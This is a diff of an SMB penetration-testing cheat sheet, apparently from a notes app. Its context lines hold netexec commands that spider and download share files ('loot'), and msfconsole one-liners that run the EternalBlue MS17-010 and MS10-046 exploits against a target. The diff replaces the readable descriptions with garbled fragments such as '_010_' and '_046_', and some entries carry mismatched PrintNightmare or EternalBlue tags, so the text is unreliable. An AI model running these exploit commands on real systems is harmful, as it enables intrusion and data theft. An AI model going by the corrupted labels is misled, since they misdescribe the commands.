@@ -3,7 +3,7 @@ id: "3bqrb1cdumpmzzai4"
 title: "smb2"
 description: ""
 tags: []
-order: 4
+order: "4"
 createdAt: "2026-05-26T18:57:37.516Z"
 updatedAt: "2026-05-26T18:58:01.006Z"
 ---
@@ -184,7 +184,7 @@ netexec smb $TARGET -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
 netexec smb $TARGET -u $USER -p $PASS -M spider_plus -o EXCLUDE_EXTENSIONS=exe,dll
 ```
 
-_Tags: #smb, #loot, #download, #smbmap, #smbclient Spider shares and search for sensitive files._
+_plus -o DOWNLOAD_
 
 **Tags:** smb, spider, loot, netexec, files
 <!-- cmd: {"id":"xf0sa3buwmpmzzsi3","language":"bash","sectionId":"oeu37fasumpmzzsek","tags":["smb","spider","loot","netexec","files"]} -->
@@ -470,7 +470,7 @@ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARG
 msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run"
 ```
 
-_Tags: #smb, #vulns, #nmap, #nse, #eternalblue, #ms17-010 EternalBlue / MS17-010 exploitation._
+_010_
 
 **Tags:** smb, eternalblue, ms17-010, metasploit, rce, exploit
 <!-- cmd: {"id":"6yfggjz23mpmzzslb","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","eternalblue","ms17-010","metasploit","rce","exploit"]} -->
@@ -484,7 +484,7 @@ nmap -p 445 --script smb-vuln-ms10-054 $TARGET
 msfconsole -q -x "use exploit/windows/smb/ms10_046_load_library; set RHOSTS $TARGET; run"
 ```
 
-_Tags: #smb, #eternalblue, #ms17-010, #metasploit, #rce, #exploit PrintNightmare check and exploit._
+_046_
 
 **Tags:** smb, printnightmare, ms-rprn, rce, exploit, impacket
 <!-- cmd: {"id":"ruexsg4ehmpmzzsle","language":"bash","sectionId":"y7ua81vxsmpmzzsfa","tags":["smb","printnightmare","ms-rprn","rce","exploit","impacket"]} -->
